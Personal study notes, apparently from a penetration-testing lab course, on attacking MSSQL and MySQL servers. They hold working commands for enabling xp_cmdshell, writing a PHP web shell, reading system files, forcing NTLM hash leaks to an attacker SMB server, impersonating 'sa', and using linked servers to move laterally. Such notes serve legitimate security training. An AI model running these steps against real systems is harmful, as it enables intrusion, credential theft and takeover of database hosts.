
Why do we want to hack these
- user credentials
- Personal Identifiable Information (PII)
- business-related data
- payment information
- lateral movement and privilege escalation
---

---

## Enumeration

- MSSQL - `TCP/1433` and `UDP/1434`, 
- MySQL - `TCP/3306`
- MSSQL operates in a "hidden" mode - `TCP/2433`

---

```shell-session
nmap -Pn -sV -sC -p1433 10.10.10.125

-Pn Do not ping Assume port is UP
```

![[Pasted image 20251105231451.png]]

---
## Authentication Mechanisms

`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in Windows or the SQL Server:

| **Authentication Type**       | **Description**                                                                                                                                                                                                                                                                                                                           |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Windows authentication mode` | This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials. |
| `Mixed mode`                  | Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.                                                                                                                                                                                     |
`MySQL` also supports different [authentication methods](https://dev.mysql.com/doc/internals/en/authentication-method.html), such as username and password, as well as Windows authentication (a plugin is required). In addition, administrators can [choose an authentication mode](https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode) for many reasons, including compatibility, security, usability, and more. However, depending on which method is implemented, misconfigurations can occur.

---
#### Misconfigurations
If anonymous access is enabled, a user without a password is configured, or any user, group, or machine is allowed to access the SQL Server.

---
#### Privileges

Depending on the user's privileges, we may be able to perform different actions within a SQL Server, such as:

- Read or change the contents of a database
- Read or change the server configuration
- Execute commands
- Read local files
- Communicate with other databases
- Capture the local system hash
- Impersonate existing users
- Gain access to other networks

---
### Connecting to DBMS


#### MySQL - Connecting to the SQL Server
```shell-session
mysql -u julio -pPassword123 -h 10.129.20.13
```

#### Sqlcmd - Connecting to the SQL Server - MSSQL
```cmd-session
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

Note: When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.
```

#### `MSSQL` from Linux, we can use `sqsh` as an alternative to `sqlcmd`
```shell-session
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

Note: When we authenticate to MSSQL using `sqsh` we can use the parameters `-h` to disable headers and footers for a cleaner look.
```

#### Impacket with the name mssqlclient.py
```shell-session
mssqlclient.py -p 1433 julio@10.129.203.7 
```
![[Pasted image 20260215133502.png]]

If we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`. 
```shell-session
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

#### Windows auth
TRY WINDOWS AUTH ALSO MAYBE for service user or so
```
mssqlclient.py mssqlsvc@10.129.203.12 -windows-auth
```
![[Pasted image 20260312023535.png]]



---
#### SQL Default Databases
`MySQL` default system schemas/databases:

- `mysql` - is the system database that contains tables that store information required by the MySQL server
- `information_schema` - provides access to database metadata
- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

`MSSQL` default system schemas/databases:

- `master` - keeps the information for an instance of SQL Server.
- `msdb` - used by SQL Server Agent.
- `model` - a template database copied for each new database.
- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
- `tempdb` - keeps temporary objects for SQL queries.

---
#### SQL Syntax

#### Show Databases
```sql
mysql> SHOW DATABASES;
```

```sql
-- sqlcmd
1> SELECT name FROM master.dbo.sysdatabases
2> GO
```


#### Select a Database
```shell-session
mysql> USE htbusers;
```

```cmd-session
1> USE htbusers
2> GO
```

#### Show Tables
```shell-session
SHOW TABLES;
```

```cmd-session
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO
```


#### Select all Data from Table "users"
```shell-session
mysql> SELECT * FROM users;
```

```cmd-session
1> SELECT * FROM users
2> go
```

---

### MSSQL - Execute Commands

If we have the appropriate privileges, we can use the SQL database to execute system commands or create the necessary elements to do it.

`MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:

- `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
- `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed

```sql
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:

```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry. Nevertheless, those methods are outside the scope of this module.

`MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.

---
### MySQL - Execute Commands by writing files

Explained in depth - [[7. Writing files]]

`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose `MySQL` operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory. Then we can browse to the location where the file is and execute our commands.

#### MySQL - Write Local File

  Attacking SQL Databases

```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.

`secure_file_priv` may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

In the following example, we can see the `secure_file_priv` variable is empty, which means we can read and write data using `MySQL`:

#### MySQL - Secure File Privileges

  Attacking SQL Databases

```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

---

### MSSQL - Execute Commands by writing files

To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:

#### MSSQL - Enable Ole Automation Procedures
```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

#### MSSQL - Create a File
```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

---
## Read Local Files

#### Read Local Files in MSSQL

By default, `MSSQL` allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:

```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```

#### MySQL - Read Local Files in MySQL

As we previously mentioned, by default a `MySQL` installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:

```shell-session
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>
```

---
## Capture MSSQL Service Hash

In [[Notes/Attackiing common services/SMB]] we had learned about forced authentication and hash stealing.

`xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system.

When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.

Steps - 
1. Create a fake SMB server
2. Ask MSSQL service account hash to connect with it using stored procedure like `xp_subdirs` or `xp_dirtree`
3. Capture the HASH

### Starting SMB server

Responder
```shell-session
sudo responder -I tun0
```

Impackets
```shell-session
sudo impacket-smbserver share ./ -smb2support
```
![[Pasted image 20260312021103.png]]
### Running stored procedure which will the connect to our SMB server

XP_DIRTREE
```cmd-session
EXEC master..xp_dirtree '\\10.10.110.17\share\'
```
![[Pasted image 20260312021130.png]]

XP_SUBDIRS
```cmd-session
EXEC master..xp_subdirs '\\10.10.110.17\share\'
```

### Example with Responder

Attack Box
```bash
sudo responder -I tun0
```
![[Pasted image 20260218182232.png]]
![[Pasted image 20260218182246.png]]
```
[SMB] NTLMv2-SSP Client   : 10.129.203.12
[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:962266e110791009:328C9F7CE159E62E16697F8A6DECBF4C:01010000000000000008D10C91A0DC01853ED230A3CCDE4A0000000002000800350059004400470001001E00570049004E002D00540059004F005800520057005500330046004E00380004003400570049004E002D00540059004F005800520057005500330046004E0038002E0035005900440047002E004C004F00430041004C000300140035005900440047002E004C004F00430041004C000500140035005900440047002E004C004F00430041004C00070008000008D10C91A0DC0106000400020000000800300030000000000000000000000000300000F2372754DBFDED48811599C63375C5F48DD5E1AB6A1E6279ADCD026BA80392B10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310030000000000000000000
```

MSSQL
```bash
./usr/share/doc/python3-impacket/examples/mssqlclient.py -p 1433 htbdbuser@10.129.203.12

> EXEC master..xp_dirtree '\\10.10.16.10\share\'
```

![[Pasted image 20260218182218.png]]

Now tryna crack the hash.
![[Pasted image 20260312021205.png]]

---
## Impersonate Existing Users with MSSQL

SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.

First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:

#### Identify Users that We Can Impersonate
```sql
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'

SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

To verify if our current user has the sysadmin role or not
```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

Lets try to impersonate a user

To impersonate a user, we can use the Transact-SQL statement `EXECUTE AS LOGIN` and set it to the user we want to impersonate.

```sql
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

    Note: It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.

To revert the operation and return to our previous user, we can use the Transact-SQL statement `REVERT`.

**Note:** If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.

---
## Communicate with Other Databases with MSSQL

`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

If we manage to gain access **to a SQL Server with a linked server configured, we may be able to move laterally to that database server**. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance.

#### Identify linked Servers in MSSQL

```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

As we can see in the query's output, we have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server. We can see [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) for more information.

Next, we can attempt to identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).

  Attacking SQL Databases

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

>**Note:** If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

As we have seen, we can now execute queries with sysadmin privileges on the linked server. As `sysadmin`, we control the SQL Server instance. We can read data from any database or execute system commands with `xp_cmdshell`.